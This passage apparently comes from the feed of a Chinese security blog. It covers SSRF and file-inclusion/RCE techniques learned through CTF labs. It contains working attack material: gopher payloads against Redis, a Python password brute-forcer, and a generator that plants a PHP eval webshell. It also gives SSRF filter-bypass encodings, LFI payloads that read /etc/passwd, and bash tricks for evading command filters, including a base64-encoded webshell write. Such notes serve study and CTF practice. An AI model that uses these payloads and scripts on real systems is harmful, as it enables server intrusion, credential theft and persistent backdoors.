%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>adbfilename %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aroot %<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>a*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>asave %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aquit %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><h3 id="http和https">http://和https://</h3><p>探测内网主机存活</p><h2 id="五绕过方式">五、绕过方式</h2><h3 id="绕过"><span class="citation" data-cites="绕过">@绕过</span></h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的。</p><h3 id="点分割符号替换">点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www。target。<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www｡target｡<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www．target．<span class="hljs-keyword">com</span>  <br></code></pre></td></tr></table></figure><h3 id="绕过127.0.0.1等本地ip">绕过127.0.0.1等本地ip</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://127.0.0.1<br>http://localhost<br>http://127.255.255.254<br>127.0.0.1 - 127.255.255.254<br><span class="hljs-link">http://</span>[<span class="hljs-string">::1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:7f00:1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:127.0.0.1</span>]<br>http://127.1<br>http://127.0.1<br>http://0:80  <br></code></pre></td></tr></table></figure><h3 id="ip的进制转换">ip的进制转换</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>进制格式：<span class="hljs-number">0300</span>.<span class="hljs-number">0250</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">16</span>进制格式：<span class="hljs-number">0</span>xC0.<span class="hljs-number">0</span>xA8.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>进制整数格式：<span class="hljs-number">3232235521</span><br><span class="hljs-attribute">16</span>进制整数格式：<span class="hljs-number">0</span>xC0A80001  <br></code></pre></td></tr></table></figure><h3 id="特殊符号">特殊符号</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  <br></code></pre></td></tr></table></figure><h3 id="urlencode">urlencode</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>data = <span class="hljs-string">&quot;www.target.com&quot;</span>;<br>alist = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), <span class="hljs-number">2</span>):<br>alist.append((x[i:i+<span class="hljs-number">2</span>]).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://%&quot;</span>+<span class="hljs-string">&#x27;%&#x27;</span>.join(alist))<br></code></pre></td></tr></table></figure><h3 id="短网址">短网址</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.985.so/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.urlc.cn/  </span><br></code></pre></td></tr></table></figure><h3 id="重定向">重定向</h3><p>在vps上部署</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.10&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="六ssrf漏洞点挖掘">六、SSRF漏洞点挖掘</h2><ol type="1"><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理,属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp;expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpressxmlrpc.php）</li></ol><p>关键字：Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</p><h2 id="七漏洞利用复现">七、漏洞利用复现</h2><h3 id="ssrf打redis">ssrf打redis</h3><p>主要方法：</p><ol type="1"><li>爆破密码</li><li>写shell</li><li>写入ssh公钥</li><li>定时任务反弹shell</li><li>主从复制</li></ol><p>参考https://www.cnblogs.com/wjrblogs/p/14456190.html</p><p>环境：CTFHUB-SSRF-Redis协议</p><p>漏洞点：<code>/?url=</code></p><figure><img src="/img/SSRF_img/clip_image002.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>xxxxxxxxxx npiet.exe -tpic download.png Python</p><figure><img src="/img/SSRF_img/clip_image004.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试用gopher爆破密码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://challenge-f6443f96c8918df3.sandbox.ctfhub.com:10800/?url=&quot;</span>  <span class="hljs-comment">#目标url</span><br>rhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span>   <br>rport = <span class="hljs-string">&quot;6379&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwd.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    passwds = file.readlines()<br>    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:<br>        passwd = passwd.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        len_pass = <span class="hljs-built_in">len</span>(passwd)<br>        payload = <span class="hljs-string">r&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r&quot;%250d%250a&quot;</span>+passwd+<span class="hljs-string">r&quot;%250D%250A%252A1%250D%250A&quot;</span><br>        url = target+<span class="hljs-built_in">str</span>(payload)<br>        text = requests.get(url).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)<br>            <span class="hljs-built_in">print</span>(text + payload)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>无果，写shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># 使用的协议 </span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># 目标redis的端口号 </span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php @eval($_POST[&#x27;xxx&#x27;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shell的名字 </span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span>      <span class="hljs-comment"># 写入的路径</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment"># 如果有密码 则填入</span><br><span class="hljs-comment"># 恶意命令 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += parse.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;二次url编码后的结果:\n&quot;</span> ,parse.quote(payload))<br><br></code></pre></td></tr></table></figure><p>生成gopher写shell的payload</p><figure><img src="/img/SSRF_img/clip_image006.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写马，执行，成功</p><figure><img src="/img/SSRF_img/clip_image008.gif" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>无法写入ssh公钥，原因：redis是www-data权限，写不进/root</p><p>无法写入定时计划反弹shell，原因：没有crontab命令</p><h3 id="ssrf打mysql">ssrf打mysql</h3><p>参考</p><p>https://www.sqlsec.com/2021/12/bytectf2021.html</p><p>https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/</p><p>ssrf dict探测到有3306。利用<ahref="https://github.com/tarunkant/Gopherus">Gopherus</a>生成payload探测mysql有无密码</p><p>注意Gopherus无法直接生成udf的payload（会截断），需要改一下代码</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含与RCE</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含与rce">文件包含与RCE</h1><h2 id="文件包含">文件包含</h2><h3 id="文件包含常见函数">文件包含常见函数</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PHP：<span class="hljs-built_in">include</span>()，<span class="hljs-built_in">include_once</span>()，<span class="hljs-built_in">require</span>()，<span class="hljs-built_in">require_once</span>()，<span class="hljs-built_in">fopen</span>()，<span class="hljs-built_in">readfile</span>() 等<br>JSP Servlet：ava<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>()，java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>() 等<br>ASP：includefile，includevirtual 等<br></code></pre></td></tr></table></figure><p>当 PHP 包含一个文件时，会将该文件当做 PHP代码执行，而不会在意文件是什么类型。</p><h3 id="本地文件包含lfi">本地文件包含(LFI)</h3><h4 id="截断">[1]%00 截断</h4><p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。<code>?file=../../../../../../../../../etc/passwd%00</code></p><h4 id="路径长度截断">[2]路径长度截断</h4><p>Linux 需要文件名长于 4096，Windows 需要长于 256。<code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></p><h4 id="点号截断">[3]点号截断</h4><p>只适用 Windows，点号需要长于 256。<code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p><h3 id="远程文件包含rfi">远程文件包含(RFI)</h3><p>条件 <code>allow_url_include = on</code></p><p>实质上和LFI一样，只是能够包含远程的文件</p><p>用得比较多的协议有<code>php://input</code></p><h3 id="伪协议">伪协议</h3><h4 id="phpinput">php://input</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>php://input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的就可以执行命令命令遇到<code>file_get_contents()</code>要联想到<code>php://input</code>绕过</p><h4 id="phpfilter">php://filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>);        <span class="hljs-comment">#文件读取</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);   <span class="hljs-comment">#文件写入</span><br><span class="hljs-meta">?&gt;</span><br><br>payload:<br><br>?file1=php:<span class="hljs-comment">//filter/resource=flag.php                             #明文读取</span><br>?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php  #编码读取</span><br> <br>?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=test                             #明文写入</span><br>?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=test #编码写入</span><br></code></pre></td></tr></table></figure><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>常见编码有两种方式：<code>base64</code>/rot-13编码，两种过滤器分别为：<code>base64：convert.base64-encode</code><code>rot-13：string.rot13</code> 扩展（绕过方式）：https://blog.csdn.net/woshilnp/article/details/117266628https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</p><h4 id="data">data://</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=On</code></p><p>类似php://input，用户控制输入流<code>data://text/plain;base64,Y2F0IC9mbGFn</code><code>data:text/plain;base64,Y2F0IC9mbGFn</code></p><h4 id="zip">zip://</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>zip://可以访问压缩包里面的文件，当它与包含函数结合时，zip://流会被当作php文件执行，从而实现任意代码执⾏。只需要是zip的压缩即可，后缀名可以任意更改<code>zip:///tmp/file.zip%23flag.txt</code></p><h4 id="phar">phar://</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，与zip协议有些相似</p><h4 id="netdoc">netdoc://</h4><p>在java中可以利用netdoc协议读取文件，可以简单认为部分代替了file协议，多用于ssrf</p><h2 id="rce">RCE</h2><p>RCE英文全称：remote command/code execute（远程命令/代码执行漏洞）漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上可能会提供给用户一个命令操作的web界面/接口，如果此接口未做过滤/有漏洞，攻击者有可能直接向服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p><h3 id="危险函数">危险函数：</h3><p>php：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>exec()</code>asp：<code>eval()</code>perl：<code>exec</code>、<code>system</code>、<code>qx//</code>python：<code>os.system()</code> go：<code>exec.Command()</code></p><h3 id="绕过方式">绕过方式</h3><h4 id="过滤cat">过滤cat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Bash">more:        一页一页的显示档案内容<br>less:        与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:        从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:        查看尾几行<br><span class="hljs-built_in">nl</span>:                显示内容，顺便输出行号<br><span class="hljs-built_in">od</span>:                以二进制的方式读取档案内容<br>vi:                一种编辑器，这个也可以查看<br>vim:        一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:        文件排序并输出也可以查看内容<br><span class="hljs-built_in">uniq</span>:        可以查看 file -f:报错出具体内容 grep<br>strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br><span class="hljs-built_in">paste</span>        把每个文件以列对列的方式，一列列地加以合并<br>grep        grep &#123; flag.php打印有”&#123;“的一行<br>sed                一种编辑器，可以用sed -f flag.php读取flag<br>rev          读取倒叙的文件内容<br></code></pre></td></tr></table></figure><h4 id="过滤空格">过滤空格</h4><p>使用<code>/**/</code>、<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20</code>、<code>%09</code>、<code>$IFS$9</code>、<code>$&#123;IFS&#125;</code>、<code>IFS</code>、<code>$IFS$1</code>等</p><h4 id="过滤分隔符">过滤分隔符 /</h4><p>利用<code>;</code>执行多条命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cd</span> xx;<span class="hljs-built_in">ls</span> -al</span><br></code></pre></td></tr></table></figure><h4 id="过滤运算符和">过滤运算符|和&amp;</h4><p>使用<code>;</code>或 <code>%0a</code></p><h4 id="过滤flagphp等字符">过滤flag、php等字符</h4><h5 id="拼接字符串绕过">拼接字符串绕过</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=m=p%0an=hp%0acat$&#123;IFS&#125;flag.$m$n<br></code></pre></td></tr></table></figure><h5 id="ls--i">ls -i</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -i + <span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure><p>组合拳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">ls</span> -i   <span class="hljs-comment">#找出文件pid</span><br><span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`   <span class="hljs-comment">#find / -inum id返回此id对应的文件名（路径）</span><br></code></pre></td></tr></table></figure><h5 id="输出到另一个文件">输出到另一个文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">printf</span> /fla &gt; /tmp/hello %26%26 <span class="hljs-built_in">printf</span> g &gt;&gt; /tmp/hello %26%26 <span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello`<br><span class="hljs-comment">#printf /fla &gt; /tmp/hello ----&gt; 将 /fla 写入/tmp/hello文件</span><br><span class="hljs-comment">#printf g &gt;&gt; /tmp/hello ----&gt; 将 g 追加写入/tmp/hello文件。目前/tmp/hello文件中的内容就是：/flag</span><br><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello` ----&gt; `<span class="hljs-built_in">cat</span> /tmp/hello` 会输入出 /flag，<span class="hljs-built_in">cat</span> 会读取 /flag ，即可得到flag。<br></code></pre></td></tr></table></figure><h5 id="编码绕过写入文件">编码绕过(写入文件)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | <span class="hljs-built_in">base64</span> -d 1.php<br></code></pre></td></tr></table></figure><h5 id="单双引号绕过">单双引号绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t fl<span class="hljs-string">&#x27;&#x27;</span>ag 或ca<span class="hljs-string">&quot;&quot;</span>t fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure><h5 id="shell变量绕过">shell变量绕过</h5><p><code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p><h5 id="反斜杠绕过">反斜杠绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t f\lag<br></code></pre></td></tr></table></figure><h5 id="通配符绕过">通配符绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f*<br><span class="hljs-built_in">cat</span> fla?<br></code></pre></td></tr></table></figure><h4 id="其他">其他</h4><h5 id="花括号">花括号</h5><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令<code>&#123;cat,flag&#125;</code></p><h5 id="反引号">反引号</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><p>相当于cat目录下所有文件</p><h5 id="非法变量">非法变量</h5><p>https://blog.csdn.net/mochu7777777/article/details/115050295</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a_b.&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p><p>传参 <code>?a[b.=system("ls");</code></p><h5 id="一些组合拳payload">一些组合拳payload</h5><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 